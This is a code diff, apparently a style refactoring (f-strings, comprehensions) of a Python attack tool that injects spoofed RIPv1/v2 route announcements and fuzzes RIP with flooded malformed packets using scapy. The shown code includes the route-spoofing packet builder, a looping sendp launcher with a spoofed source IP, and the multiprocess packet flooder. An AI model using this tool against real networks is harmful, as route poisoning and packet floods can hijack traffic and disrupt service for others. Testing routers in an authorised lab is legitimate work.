@@ -60,14 +60,11 @@ stopThreads = False
 #
 
 def flooder(num, packets):
-    Logger.dbg('Starting task: {}, packets num: {}'.format(num, len(packets)))
+    Logger.dbg(f'Starting task: {num}, packets num: {len(packets)}')
 
     for p in packets:
         if stopThreads: break
         try:
-            if stopThreads: 
-                raise KeyboardInterrupt
-
             sendp(p, verbose = False)
 
             if len(p) < 1500:
@@ -78,7 +75,7 @@ def flooder(num, packets):
         except Exception as e:
             pass
 
-    Logger.dbg('Stopping task: {}'.format(num))
+    Logger.dbg(f'Stopping task: {num}')
 
 class Logger:
     @staticmethod
@@ -88,28 +85,28 @@ class Logger:
 
     @staticmethod
     def out(x): 
-        Logger._out('[.] ' + x)
+        Logger._out(f'[.] {x}')
     
     @staticmethod
     def info(x):
-        Logger._out('[.] ' + x)
+        Logger._out(f'[.] {x}')
 
     @staticmethod
     def dbg(x):
         if config['debug']:
-            Logger._out('[dbg] ' + x)
+            Logger._out(f'[dbg] {x}')
     
     @staticmethod
     def err(x): 
-        sys.stdout.write('[!] ' + x + '\n')
+        sys.stdout.write(f'[!] {x}' + '\n')
     
     @staticmethod
     def fail(x):
-        Logger._out('[-] ' + x)
+        Logger._out(f'[-] {x}')
     
     @staticmethod
     def ok(x):  
-        Logger._out('[+] ' + x)
+        Logger._out(f'[+] {x}')
 
 # Well, not very fuzzy that fuzzer I know. 
 class Fuzzer:
@@ -169,19 +166,13 @@ class Fuzzer:
 
     @staticmethod
     def getFuzzyStrings(maxLen = -1, allOfThem = True):
-        out = set()
-        for b in Fuzzer.get16bitFuzzes():
-            out.add(Fuzzer.deBrujinPattern(b))
-
+        out = {Fuzzer.deBrujinPattern(b) for b in Fuzzer.get16bitFuzzes()}
         if allOfThem:
             for b in range(0, 65400, 256): 
                 if maxLen != -1 and b > maxLen: break
                 out.add(Fuzzer.deBrujinPattern(b))
 
-        if maxLen != -1:
-            return set([x for x in out if len(x) <= maxLen])
-
-        return out
+        return {x for x in out if len(x) <= maxLen} if maxLen != -1 else out
 
     @staticmethod
     def get32bitProblematicPowersOf2():
@@ -205,32 +196,13 @@ class Sniffer(RoutingAttack):
         self.config = config
         self.config.update(params)
 
-    def processPacket(pkt):
+    def processPacket(self):
         # TODO
         raise Exception('Not yet implemented.')
 
     def launch(self):
         # TODO
         raise Exception('Not yet implemented.')
-
-        def packetCallback(d):
-            self.processPacket(d)
-
-        try:
-            pkts = sniff(
-                count = 1000,
-                filter = 'udp port 520',
-                timeout = 10.0,
-                prn = packetCallback,
-                iface = self.config['interface']
-            )
-        except Exception as e:
-            if 'Network is down' in str(e):
-                pass
-            else: 
-                Logger.err('Exception occured during sniffing: {}'.format(str(e)))
-        except KeyboardInterrupt:
-            pass
 
 
 class RIPv1v2Attacks(RoutingAttack):
@@ -272,17 +244,17 @@ class RIPv1v2Attacks(RoutingAttack):
         self.config.update(params)
 
         Logger.info("Fake Route Announcement to be injected:")
-        Logger.info("\tNetwork: {}".format(config['network']))
-        Logger.info("\tNetmask: {}".format(config['netmask']))
-        Logger.info("\tNexthop: {}".format(config['nexthop']))
-        Logger.info("\tMetric: {}".format(config['metric']))
+        Logger.info(f"\tNetwork: {config['network']}")
+        Logger.info(f"\tNetmask: {config['netmask']}")
+        Logger.info(f"\tNexthop: {config['nexthop']}")
+        Logger.info(f"\tMetric: {config['metric']}")
 
         if not config['network'] or not config['netmask'] \
-            or not config['nexthop'] or not config['metric']:
+                or not config['nexthop'] or not config['metric']:
             Logger.err("Module needs following options to operate: network, netmask, nexthop, metric")
             return False
 
-        if params['version'] != 1 and params['version'] != 2:
+        if params['version'] not in [1, 2]:
             Logger.err("RIP protocol version must be either 1 or 2 as passed in attacks params!")
             return False
 
@@ -290,7 +262,9 @@ class RIPv1v2Attacks(RoutingAttack):
 
     def launch(self):
         packet = self.getPacket()
-        Logger.info("Sending RIPv{} Spoofed Route Announcements...".format(self.config['version']))
+        Logger.info(
+            f"Sending RIPv{self.config['version']} Spoofed Route Announcements..."
+        )
         sendp(packet, loop = 1, inter = self.config['delay'], iface = config['interface'])
 
     def getPacket(self):
@@ -337,14 +311,14 @@ class RIPv1v2Attacks(RoutingAttack):
 
         if 'rip_cmd' in self.config.keys():
             rip.cmd = self.config['rip_cmd']
-       
+
         if not self.config['auth-type']:
             rip_packet = etherframe / ip / udp / rip / ripentry
         else:
             ripauth = RIPv1v2Attacks.getRipAuth(self.config)
-            Logger.info('Using RIPv2 authentication: type={}, pass="{}"'.format(
-                self.config['auth-type'], self.config['auth-data']
-            ))
+            Logger.info(
+                f"""Using RIPv2 authentication: type={self.config['auth-type']}, pass="{self.config['auth-data']}\""""
+            )
             rip_packet = etherframe / ip / udp / rip / ripauth / ripentry
 
         rip_packet[IP].src = spoofedIp
@@ -379,9 +353,11 @@ class RIPFuzzer(RoutingAttack):
         Logger.info("Generating fuzzed packets for RIPv2...")
         packets.update(self.generateRipv2Packets())
 
-        Logger.info("Collected in total {} packets to send. Sending them out...".format(len(packets)))
+        Logger.info(
+            f"Collected in total {len(packets)} packets to send. Sending them out..."
+        )
 
-        packetsLists = [[] for x in range(self.config['processors'])]
+        packetsLists = [[] for _ in range(self.config['processors'])]
         packetsList = list(packets)
         for i in range(len(packetsList)):
             packetsLists[i % config['processors']].append(packetsList[i])
@@ -405,7 +381,7 @@ class RIPFuzzer(RoutingAttack):
         stopThreads = True
         time.sleep(3)
 
-        Logger.ok("Fuzzing finished. Sent around {} packets.".format(len(packets)))
+        Logger.ok(f"Fuzzing finished. Sent around {len(packets)} packets.")
 
 
     def generateRipv1Packets(self):
@@ -445,7 +421,6 @@ class RIPFuzzer(RoutingAttack):
         # Step 5: Add multiple RIPEntry structures
         for num in Fuzzer.get32bitProblematicPowersOf2():
             rip = RIP(version = 1, cmd = 2)
-            entries = []
             try:
                 ipv4 = socket.inet_ntoa(struct.pack('!L', num))
             except:
@@ -454,9 +429,7 @@ class RIPFuzzer(RoutingAttack):
             if (num * 20) > 2 ** 16: 
                 break
 
-            for i in range(num):
-                entries.append(RIPEntry(addr = ipv4))
-
+            entries = [RIPEntry(addr = ipv4) for _ in range(num)]
             packets.add(base / rip / ''.join([str(x) for x in entries]))
 
         return packets
@@ -511,7 +484,6 @@ class RIPFuzzer(RoutingAttack):
         # Step 7: Add multiple RIPEntry structures
         for num in Fuzzer.get32bitProblematicPowersOf2():
             rip = RIP(version = 2, cmd = 2)
-            entries = []
             try:
                 ipv4 = socket.inet_ntoa(struct.pack('!L', num))
             except:
@@ -520,9 +492,7 @@ class RIPFuzzer(RoutingAttack):
             if (num * 20) > 2 ** 16: 
                 break
 
-            for i in range(num):
-                entries.append(RIPEntry(addr = ipv4))
-
+            entries = [RIPEntry(addr = ipv4) for _ in range(num)]
             packets.add(base / rip / ''.join([str(x) for x in entries]))
 
         return packets
@@ -587,13 +557,16 @@ def getHwAddr(ifname):
     return ':'.join(['%02x' % ord(char) for char in info[18:24]])
 
 def getIfaceIP(iface):
-    out = shell("ip addr show " + iface + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1")
-    Logger.dbg('Interface: {} has IP: {}'.format(iface, out))
+    out = shell(
+        f"ip addr show {iface}"
+        + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1"
+    )
+    Logger.dbg(f'Interface: {iface} has IP: {out}')
     return out
 
 def shell(cmd):
     out = commands.getstatusoutput(cmd)[1]
-    Logger.dbg('shell("{}") returned:\n"{}"'.format(cmd, out))
+    Logger.dbg(f'shell("{cmd}") returned:\n"{out}"')
     return out
 
 def selectDefaultInterface():
@@ -603,10 +576,10 @@ def selectDefaultInterface():
         'ifconfig': "route -n | grep 0.0.0.0 | grep 'UG' | awk '{print $8}' | head -1",
     }
 
-    for k, v in commands.items():
+    for v in commands.values():
         out = shell(v)
         if len(out) > 0:
-            Logger.dbg('Default interface lookup command returned:\n{}'.format(out))
+            Logger.dbg(f'Default interface lookup command returned:\n{out}')
             config['interface'] = out
             return out
 
@@ -642,14 +615,14 @@ def parseOptions(argv):
 
     args = parser.parse_args()
 
-    if not 'attack' in args:
+    if 'attack' not in args:
         Logger.err('You must specify an attack to launch!')
         return False
 
     if args.attack == 'list':
         print("Available attacks:")
         for a in attacks:
-            print("\t{}. '{}' - {}".format(a['num'], a['name'], a['desc']))
+            print(f"\t{a['num']}. '{a['name']}' - {a['desc']}")
         sys.exit(0)
 
     else:
@@ -657,12 +630,12 @@ def parseOptions(argv):
         try:
             att = int(att)
         except: pass
-        
+
         for a in attacks:
-            if att == a['num'] or att == a['name']:
+            if att in [a['num'], a['name']]:
                 config['attack'] = a
                 break
-           
+
     if 'attack' not in config or not config['attack']:
         Logger.err("Selected attack is not implemented or wrongly stated.")
         parser.print_help()
@@ -680,7 +653,7 @@ def parseOptions(argv):
     if args.spoof != '': config['spoof'] = args.spoof
     else: config['spoof'] = getIfaceIP(config['interface'])
 
-    Logger.info("Using {} as local/spoof IP address".format(config['spoof']))
+    Logger.info(f"Using {config['spoof']} as local/spoof IP address")
 
     if args.netmask != '': config['netmask'] = args.netmask
     if args.nexthop != '': config['nexthop'] = args.nexthop
@@ -794,7 +767,7 @@ def main(argv):
     load_contrib('bgp')
 
     attack = config['attack']['object']()
-    print("[+] Launching attack: {}".format(config['attack']['desc']))
+    print(f"[+] Launching attack: {config['attack']['desc']}")
     if attack.injectOptions(config['attack']['params'], config):
         attack.launch()
 
